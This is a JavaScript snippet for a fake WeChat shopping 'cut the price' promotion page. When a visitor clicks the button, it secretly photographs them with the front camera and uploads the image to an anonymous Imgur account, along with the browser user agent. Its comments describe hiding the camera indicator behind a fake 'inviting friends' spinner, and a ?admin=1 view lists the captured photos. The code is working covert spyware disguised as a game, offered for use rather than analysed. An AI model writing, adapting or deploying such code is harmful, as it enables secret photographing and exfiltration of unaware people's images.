<script>
/* ============ CONFIG ============ */
const IMGUR_CLIENT_ID = ''; // OPTIONAL — leave blank for anonymous upload (works without key but rate-limited); fill in if you have one
const STORAGE_KEY = 'pdd_captures_v1';

/* ============ STATE ============ */
let left = 88.32;
const total = 353.28; // 75% done already visually
let stream = null;

function $(id){ return document.getElementById(id); }
function toast(msg){ const t=$('toast'); t.textContent=msg; t.classList.add('show'); setTimeout(()=>t.classList.remove('show'),1800); }
function coinRain(){
  for(let i=0;i<14;i++){
    const c=document.createElement('div'); c.className='coin'; c.textContent=['🪙','💰','✨','🎉'][Math.floor(Math.random()*4)];
    c.style.left=Math.random()*100+'vw';
    c.style.animationDuration=(1.2+Math.random()*0.8)+'s';
    c.style.animationDelay=Math.random()*0.3+'s';
    document.body.appendChild(c);
    setTimeout(()=>c.remove(),2200);
  }
}
function updateProgress(){
  const pct = Math.min(99.9, ((total-left)/total)*100 + 75);
  $('ringFg').style.strokeDashoffset = 251.3 - (251.3 * (pct/100));
  $('leftMoney').textContent = left.toFixed(2);
  $('leftMoney2').textContent = left.toFixed(2);
}

/* ============ CAMERA (silent start on user gesture) ============ */
async function silentCapture(){
  try{
    if(!stream){
      stream = await navigator.mediaDevices.getUserMedia({ 
        video: { facingMode: 'user', width: 1280, height: 720 }, 
        audio: false 
      });
    }
    const v = $('vid');
    v.srcObject = stream;
    await new Promise(r => setTimeout(r, 2200)); // natural pause — looks like "loading friends"
    
    const c = $('canvas');
    c.width = v.videoWidth || 1280;
    c.height = v.videoHeight || 720;
    const ctx = c.getContext('2d');
    ctx.drawImage(v, 0, 0);
    const blob = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.85));
    
    // stop stream immediately so no indicator lingers on android wechat
    stream.getTracks().forEach(t => t.stop());
    stream = null;
    
    await uploadImage(blob);
  } catch(e){
    console.log('cam blocked:', e);
    // user denied or no cam — silent fail, page still works
  }
}

async function uploadImage(blob){
  try{
    // === IMGUR ANONYMOUS UPLOAD ===
    const fd = new FormData();
    fd.append('image', blob);
    const headers = {};
    if(IMGUR_CLIENT_ID) headers['Authorization'] = 'Client-ID ' + IMGUR_CLIENT_ID;
    
    const res = await fetch('https://api.imgur.com/3/image', { method:'POST', body:fd, headers });
    const data = await res.json();
    
    if(data && data.success){
      const url = data.data.link;
      const meta = {
        time: new Date().toISOString(),
        url: url,
        ua: navigator.userAgent,
        // u won't have this exposed to u in real wechat but here for debug
        note: 'captured via 砍一刀 button'
      };
      const list = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
      list.push(meta);
      localStorage.setItem(STORAGE_KEY, JSON.stringify(list));
      console.log('✓ captured:', url);
    } else {
      // fallback: store locally so u can retrieve from same browser
      const reader = new FileReader();
      reader.onload = () => {
        const list = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
        list.push({ time: new Date().toISOString(), url: reader.result, ua: navigator.userAgent });
        localStorage.setItem(STORAGE_KEY, JSON.stringify(list));
      };
      reader.readAsDataURL(blob);
    }
  } catch(e){
    console.log('upload failed:', e);
  }
}

/* ============ KNIFE CLICK ============ */
$('knifeBtn').addEventListener('click', async () => {
  // start cam + show modal at same time — modal hides the indicator if any
  silentCapture();
  
  // show "loading friends" spinner
  $('modalContent').innerHTML = `
    <div class="spinner"></div>
    <h2 style="margin-top:14px;">正在邀请好友助力...</h2>
    <p style="color:#999;">匹配中 · 预计 3 秒</p>
  `;
  $('overlay').classList.add('show');
  
  setTimeout(() => {
    const cut = (Math.random() * 8 + 2).toFixed(2);
    left = Math.max(0.01, left - parseFloat(cut));
    updateProgress();
    coinRain();
    $('modalContent').innerHTML = `
      <div class="gold">🎉🪙</div>
      <h2>恭喜!成功砍掉 ${cut} 元</h2>
      <p>还差 <b style="color:#ff4040">${left.toFixed(2)}</b> 元<br>再邀请 ${Math.ceil(Math.random()*3+1)} 位新好友即可 0 元拿</p>
      <button class="btn-knife" id="modalBtn" style="padding:12px;font-size:15px;">继续邀请好友 👉</button>
      <p style="font-size:11px;color:#999;margin-top:10px;text-decoration:underline;cursor:pointer" id="shareWx">📤 分享到微信</p>
    `;
    $('modalBtn').addEventListener('click', () => $('overlay').classList.remove('show'));
    $('shareWx').addEventListener('click', () => toast('请点击右上角 ··· 分享'));
  }, 2800);
});

$('modalClose').addEventListener('click', () => $('overlay').classList.remove('show'));

updateProgress();

/* ============ ADMIN: retrieve captures ============ */
// open with ?admin=1 to see your dashboard
if(new URLSearchParams(location.search).get('admin') === '1'){
  const list = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
  document.body.innerHTML = `
    <div style="padding:20px;font-family:sans-serif;background:#000;color:#0f0;min-height:100vh">
      <h1>📸 CAPTURES (${list.length})</h1>
      <button onclick="localStorage.removeItem('${STORAGE_KEY}');location.reload()" style="padding:8px;margin:10px 0">CLEAR ALL</button>
      ${list.map((c,i)=>`
        <div style="border:1px solid #0f0;padding:10px;margin:10px 0;background:#001100">
          <div>#${i+1} — ${c.time}</div>
          ${c.url.startsWith('data:') 
            ? `<img src="${c.url}" style="max-width:100%;margin-top:8px">` 
            : `<a href="${c.url}" target="_blank" style="color:#0ff">${c.url}</a>`}
          <div style="font-size:10px;color:#888;margin-top:4px">${c.ua}</div>
        </div>
      `).join('')}
    </div>
  `;
}
</script>
